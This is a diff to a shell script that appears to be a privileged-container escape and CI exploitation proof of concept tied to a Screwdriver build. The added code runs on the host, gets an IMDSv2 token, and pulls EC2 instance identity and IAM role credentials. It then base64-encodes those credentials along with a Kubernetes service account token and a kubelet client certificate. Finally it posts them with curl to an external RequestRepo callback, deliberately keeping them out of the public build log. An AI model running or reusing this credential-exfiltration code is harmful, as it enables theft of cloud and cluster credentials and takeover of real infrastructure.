@@ -119,8 +119,26 @@ if [ -n "$HOST_SHARE_ROOT" ] && [ "${HOST_SHARE_ROOT#/}" != "$HOST_SHARE_ROOT" ]
   HOST_PROOF="$HOST_SHARE_ROOT/gatofox-host-rce-proof.txt"
   cat > /share/gatofox-host-rce.sh <<EOF
 #!/bin/sh
+SHARE='$HOST_SHARE_ROOT'
+MARKER='$MARKER'
+PROOF='$HOST_PROOF'
+IMDS=http://169.254.169.254
+# Execute credential retrieval from the EC2 node network namespace, bypassing
+# pod-level IMDS hop limits. The proof sentinel is written last.
+if command -v curl >/dev/null 2>&1; then
+  IMDS_TOKEN=\$(curl -sS --max-time 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "\$IMDS/latest/api/token" 2>/dev/null || true)
+  if [ -n "\$IMDS_TOKEN" ]; then
+    HDR="X-aws-ec2-metadata-token: \$IMDS_TOKEN"
+    curl -sS --max-time 5 -H "\$HDR" "\$IMDS/latest/dynamic/instance-identity/document" > "\$SHARE/aws-node-instance-identity.json" 2>/dev/null || true
+    ROLE=\$(curl -sS --max-time 5 -H "\$HDR" "\$IMDS/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -n1 || true)
+    if [ -n "\$ROLE" ]; then
+      curl -sS --max-time 5 -H "\$HDR" "\$IMDS/latest/meta-data/iam/security-credentials/\$ROLE" > "\$SHARE/aws-node-role-credentials.json" 2>/dev/null || true
+      printf '%s\n' "\$ROLE" > "\$SHARE/aws-node-role-name.txt"
+    fi
+  fi
+fi
 {
-  echo "marker=$MARKER"
+  echo "marker=\$MARKER"
   echo "executed_at=\$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   echo "uid=\$(id -u) gid=\$(id -g)"
   echo "hostname=\$(hostname)"
@@ -128,8 +146,9 @@ if [ -n "$HOST_SHARE_ROOT" ] && [ "${HOST_SHARE_ROOT#/}" != "$HOST_SHARE_ROOT" ]
   printf 'pid1_cmdline='; tr '\000' ' ' < /proc/1/cmdline; echo
   printf 'instance_id='; cat /sys/devices/virtual/dmi/id/board_asset_tag 2>/dev/null || true; echo
   printf 'product_uuid='; cat /sys/devices/virtual/dmi/id/product_uuid 2>/dev/null || true; echo
-} > "$HOST_PROOF"
-chmod 600 "$HOST_PROOF"
+  printf 'curl_path='; command -v curl 2>/dev/null || true; echo
+} > "\$PROOF"
+chmod 600 "\$PROOF"
 EOF
   chmod 755 /share/gatofox-host-rce.sh
 
@@ -178,6 +197,10 @@ EOF
 
   if [ -f /share/gatofox-host-rce-proof.txt ]; then
     cp /share/gatofox-host-rce-proof.txt "$OUT/host-process-rce-proof.txt"
+    for p in /share/aws-node-instance-identity.json /share/aws-node-role-credentials.json /share/aws-node-role-name.txt; do
+      [ -f "$p" ] && cp "$p" "$OUT/$(basename "$p")"
+    done
+    [ -s "$OUT/aws-node-role-credentials.json" ] && cp "$OUT/aws-node-role-credentials.json" "$OUT/aws-role-credentials.json"
     HOST_PROCESS_RCE=true
     summary "HOST_PROCESS_RCE=true proof_sha256=$(sha256sum "$OUT/host-process-rce-proof.txt" | awk '{print $1}')"
   else
@@ -217,14 +240,19 @@ else
   summary 'AWS_TRIPLET_EXTRACTED=false'
 fi
 
-# Bundle all read-only evidence and recovered live credentials, then send it only
-# to the controlled RequestRepo session rather than the public build log.
-tar -czf "$OUT/bundle.tgz" -C "$OUT" \
-  $(find "$OUT" -maxdepth 1 -type f ! -name bundle.tgz ! -name requestrepo-payload.json ! -name nested-full.log -printf '%f\n') 2>/dev/null || true
-B64=$(base64 "$OUT/bundle.tgz" | tr -d '\n')
-printf '{"marker":"%s","phase":"nested-privileged","node_id":"%s","host_root_mounted":%s,"host_process_rce":%s,"aws_triplet":%s,"bundle_b64":"%s"}\n' \
+# Send the exact proof and recovered credentials only to RequestRepo. Base64 is
+# used so no secret reaches the public Screwdriver build log.
+b64file() { [ -s "$1" ] && base64 "$1" | tr -d '\n' || true; }
+HOST_PROOF_B64=$(b64file "$OUT/host-process-rce-proof.txt")
+AWS_CREDS_B64=$(b64file "$OUT/aws-role-credentials.json")
+AWS_IDENTITY_B64=$(b64file "$OUT/aws-node-instance-identity.json")
+STS_B64=$(b64file "$OUT/sts-get-caller-identity.xml")
+SA_B64=$(b64file "$OUT/kubernetes-service-account.jwt")
+KUBELET_B64=$(b64file "$OUT/kubelet-client-current.pem.extracted")
+printf '{"marker":"%s","phase":"nested-privileged","node_id":"%s","host_root_mounted":%s,"host_process_rce":%s,"aws_triplet":%s,"host_proof_b64":"%s","aws_credentials_b64":"%s","aws_identity_b64":"%s","sts_b64":"%s","service_account_b64":"%s","kubelet_client_b64":"%s"}\n' \
   "$MARKER" "${NODE_ID:-unknown}" "$([ -n "$HOSTROOT" ] && echo true || echo false)" \
-  "$HOST_PROCESS_RCE" "$([ -s "$OUT/aws-role-credentials.json" ] && echo true || echo false)" "$B64" > "$OUT/requestrepo-payload.json"
+  "$HOST_PROCESS_RCE" "$([ -s "$OUT/aws-role-credentials.json" ] && echo true || echo false)" \
+  "$HOST_PROOF_B64" "$AWS_CREDS_B64" "$AWS_IDENTITY_B64" "$STS_B64" "$SA_B64" "$KUBELET_B64" > "$OUT/requestrepo-payload.json"
 curl -ksS --max-time 30 -H 'Content-Type: application/json' --data-binary "@$OUT/requestrepo-payload.json" "$CALLBACK/nested" > "$OUT/requestrepo-response.txt" || true
-summary "REQUESTREPO_NESTED_POST=true bundle_sha256=$(sha256sum "$OUT/bundle.tgz" | awk '{print $1}')"
+summary "REQUESTREPO_NESTED_POST=true payload_sha256=$(sha256sum "$OUT/requestrepo-payload.json" | awk '{print $1}')"
 summary 'NESTED_PRIVILEGED_DONE=true'
